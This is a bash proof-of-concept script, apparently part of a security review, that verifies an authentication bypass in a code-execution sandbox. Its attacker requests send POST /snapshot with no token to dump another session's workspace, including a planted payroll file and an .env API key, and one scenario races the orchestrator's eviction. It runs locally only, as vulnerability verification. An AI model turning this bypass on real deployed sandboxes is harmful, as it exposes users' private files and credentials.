#!/usr/bin/env bash
# Verifier PoC for L2-cee-snapshot-auth-bypass (local only, no network egress).
#
# All three components are UNMODIFIED source builds:
#   api-server, executor  code-execution-environment @ 8676c64 built like the
#                         Dockerfiles (go1.26.2, CGO_ENABLED=0, -trimpath, -mod=readonly)
#   shim                  github.com/tinfoilsh/tfshim v0.3.18 = shim-version pinned in
#                         code-execution-environment/tinfoil-config.yml (module zip
#                         verified by sum.golang.org); only linked against a link-only
#                         NVML stub because no GPU/C toolchain exists here.
# The container layout is reproduced with a chroot that has the real paths
# (/workspace 1777, /user-uploads 1000:755, /run/execsock shared), uid:gid 1000:1000,
# api-server with no capabilities, executor with only SETUID/SETGID (what
# cap_add + `setcap cap_setuid,cap_setgid+ep /executor` give in production).
# The shim config is generated from the `shim:` block of the real tinfoil-config.yml.
# Differences from production: dummy attestation + self-signed cert (domain=localhost),
# listen port 28443 instead of 443, no CVM. None of these touch the request path.
set -u
W=/root/.claude/jobs/632f70ea/tmp/work/verify3-L2-cee-snapshot-auth-bypass-poc
R=$W/rootfs
P=$W/poc
O=$P/out
BIN=$W/bin
PY="$W/venv/bin/python -I"
SHIM_PORT=28443
S=https://localhost:$SHIM_PORT
H='Content-Type: application/json'
AUTH=X-Code-Execution-Container-Auth-Token
rm -rf "$O"; mkdir -p "$O/shim"

mkroot() { # fresh container filesystem (one container per chat session)
  rm -rf "$R"
  mkdir -p "$R"/{workspace,user-uploads,tmp,run/execsock,usr/bin,usr/lib/x86_64-linux-gnu,lib64,etc,dev}
  ln -s usr/bin "$R/bin"
  chmod 1777 "$R/workspace" "$R/tmp"                         # tmpfs mode=1777
  chown 1000:1000 "$R/user-uploads" "$R/run/execsock"; chmod 755 "$R/user-uploads"
  mknod -m 666 "$R/dev/null" c 1 3; mknod -m 666 "$R/dev/urandom" c 1 9
  cp "$BIN/api-server" "$BIN/executor" "$R/"
  for b in bash mkdir cat ls id cp head sha256sum; do cp "$(command -v $b)" "$R/usr/bin/"; done
  for l in libc.so.6 libtinfo.so.6 libgcc_s.so.1 libm.so.6 libpcre2-8.so.0 libselinux.so.1 libacl.so.1 libattr.so.1; do
    cp /usr/lib/x86_64-linux-gnu/$l "$R/usr/lib/x86_64-linux-gnu/"; done
  cp /lib64/ld-linux-x86-64.so.2 "$R/lib64/"
  printf 'root:x:0:0::/root:/bin/bash\nexecutor:x:1000:1000::/tmp:/bin/bash\nbashuser:x:1001:1001::/tmp:/bin/bash\n' > "$R/etc/passwd"
  printf 'root:x:0:\nexecutor:x:1000:\nbashuser:x:1001:\n' > "$R/etc/group"
}

PIDS=()
start_container() { # $1 = label
  "$BIN/launch" "$R" setuid,setgid /executor > "$O/$1-executor.log" 2>&1 & PIDS+=($!)
  for i in $(seq 1 50); do [ -S "$R/run/execsock/exec.sock" ] && break; sleep 0.1; done
  "$BIN/launch" "$R" "" /api-server > "$O/$1-api-server.log" 2>&1 & PIDS+=($!)
  for i in $(seq 1 100); do curl -sk -o /dev/null -w '%{http_code}' -X GET $S/health 2>/dev/null | grep -q 200 && break; sleep 0.1; done
  local ep ap
  ep=$(pgrep -f '^/executor$' | head -1); ap=$(pgrep -f '^/api-server$' | head -1)
  # CapEff 0xc0 = CAP_SETGID|CAP_SETUID only; 0 = no capabilities (cap_drop ALL)
  echo "[$1] executor   pid=$ep $(grep -E '^(Uid|Gid|Groups|CapEff)' /proc/$ep/status | tr -s '\t ' ' ' | tr '\n' ' ')"
  echo "[$1] api-server pid=$ap $(grep -E '^(Uid|Gid|Groups|CapEff)' /proc/$ap/status | tr -s '\t ' ' ' | tr '\n' ' ')"
}
stop_container() {
  pkill -f '^/executor$'; pkill -f '^/api-server$'; sleep 0.3
}
cleanup() { stop_container 2>/dev/null; kill "${SHIM_PID:-}" 2>/dev/null; }
trap cleanup EXIT

post() { # $1 path, $2 token ('' = none), $3 data(optional, '@file' allowed)
  local args=(-sk -X POST "$S$1" -H "$H" -w '  -> HTTP %{http_code}\n')
  [ -n "$2" ] && args+=(-H "$AUTH: $2")
  [ -n "${3:-}" ] && args+=(--data-binary "$3")
  curl "${args[@]}"
}

# ---------------------------------------------------------------- shim
echo "=== shim: tfshim v0.3.18 with the shim: block of code-execution-environment/tinfoil-config.yml"
$PY "$P/shimcfg.py" "$W/src/cee/tinfoil-config.yml" "$O/shim/shim.yml" $SHIM_PORT "$O/shim"
printf 'env:\n  DOMAIN: localhost\n' > "$O/shim/external.yml"
"$BIN/tfshim-v0.3.18" -c "$O/shim/shim.yml" -e "$O/shim/external.yml" > "$O/shim.log" 2>&1 & SHIM_PID=$!
sleep 1

TOKEN=$($PY -c 'import secrets;print(secrets.token_hex(32))')   # = webapp HKDF(chatKEK, "tinfoil-code-execution-v1:"+chatId), 64 hex

# ================================================================ scenario A
echo; echo "################ Scenario A: attacker dumps an active session's workspace with no token"
mkroot; start_container A
echo; echo "--- [orchestrator, victim token] /restore the chat's previous (decrypted) workspace -> container stays 'warm'"
post /restore "$TOKEN" "{\"tar\":\"$($PY "$P/tarutil.py" mk-restore)\"}"
echo "--- [attacker, no token] /snapshot while warm"
post /snapshot ""
echo "--- [orchestrator, victim token] /sync-uploads: the user's attached file (first user-driven call -> 'active')"
CSV=$'name,salary\nalice,123456\nbob,98765\n'
CSV_B64=$(printf '%s' "$CSV" | base64 -w0); CSV_SHA=$(printf '%s' "$CSV" | sha256sum | cut -d' ' -f1)
post /sync-uploads/manifest "$TOKEN" "{\"manifest\":[{\"filename\":\"payroll.csv\",\"sha256\":\"$CSV_SHA\"}]}"
post /sync-uploads/blobs "$TOKEN" "{\"files\":[{\"filename\":\"payroll.csv\",\"sha256\":\"$CSV_SHA\",\"contents\":\"$CSV_B64\"}]}"
echo "--- [orchestrator, victim token] /exec (model's bash, runs as uid 1001 in /workspace)"
post /exec "$TOKEN" '{"command":"mkdir -p analysis && cp /user-uploads/payroll.csv analysis/ && echo \"median salary: 111,110 (do not share)\" > analysis/summary.txt && id > analysis/ran_as.txt && ls -la"}'
echo "--- [orchestrator, victim token] /write"
post /write "$TOKEN" "{\"path\":\"/workspace/.env\",\"contents\":\"$(printf 'OPENAI_API_KEY=sk-live-VICTIM-SECRET\n' | base64 -w0)\"}"

echo; echo "--- [attacker] every user-driven path is gated by the token:"
for p in /read /exec /write /restore /sync-uploads/manifest; do
  printf '%-24s no token     ' "$p"; post $p "" '{"path":"analysis/summary.txt","command":"id","contents":"","tar":"","manifest":[]}'
done
printf '%-24s wrong token  ' /read; post /read "$(printf 'a%.0s' {1..64})" '{"path":"analysis/summary.txt"}'
echo; echo "--- [attacker, no token, no body] POST /snapshot"
curl -sk -X POST $S/snapshot -o "$O/A-stolen.json" -D "$O/A-stolen.headers" -w 'HTTP %{http_code}, %{size_download} bytes\n'
cat "$O/A-stolen.headers"
$PY "$P/tarutil.py" dump "$O/A-stolen.json"
echo; echo "--- [orchestrator, victim token] next tool call and the eviction snapshot after the attack"
post /exec "$TOKEN" '{"command":"cat analysis/summary.txt"}'
post /snapshot ""
stop_container
echo "api-server log (A):"; cat "$O/A-api-server.log"

# ================================================================ scenario B
echo; echo "################ Scenario B: same dump, overlapped with the orchestrator's eviction snapshot (session never disturbed)"
mkroot; start_container B
post /restore "$TOKEN" "{\"tar\":\"$($PY "$P/tarutil.py" mk-restore)\"}"
post /exec "$TOKEN" '{"command":"mkdir -p data && head -c 96000000 /dev/urandom > data/big_dataset.bin && echo \"model output for the user\" > report.md && sha256sum data/big_dataset.bin"}'
echo "--- attacker starts /snapshot (no token) and holds it open; orchestrator evicts 2s later"
T0=$(date +%s.%N)
rel() { awk -v a="$(date +%s.%N)" -v b="$T0" 'BEGIN{printf "t=%5.2fs", a-b}'; }
$PY "$P/attacker_slow.py" localhost $SHIM_PORT "$O/B-stolen.json" 1048576 6 > "$O/B-attacker.out" 2>&1 & ATT=$!
sleep 2
echo "[orchestrator] $(rel) eviction POST /snapshot (no token, as the orchestrator does) -- attacker request still open"
curl -sk --http1.1 -X POST $S/snapshot -o "$O/B-orchestrator.json" -D "$O/B-orchestrator.headers" -w '[orchestrator] HTTP %{http_code}, %{size_download} bytes\n'
echo "[orchestrator] $(rel) eviction snapshot finished; attacker still running: $(kill -0 $ATT 2>/dev/null && echo yes || echo no)"
grep -i -E '^(HTTP|x-snapshot-status|trailer)' "$O/B-orchestrator.headers"
wait $ATT; cat "$O/B-attacker.out"
echo "[orchestrator copy] $($PY "$P/tarutil.py" summary "$O/B-orchestrator.json")"
echo "[attacker copy]     $($PY "$P/tarutil.py" summary "$O/B-stolen.json")"
echo "--- container state afterwards (expected 'killed' after a normal eviction):"
post /exec "$TOKEN" '{"command":"true"}'
stop_container
echo "api-server log (B):"; cat "$O/B-api-server.log"
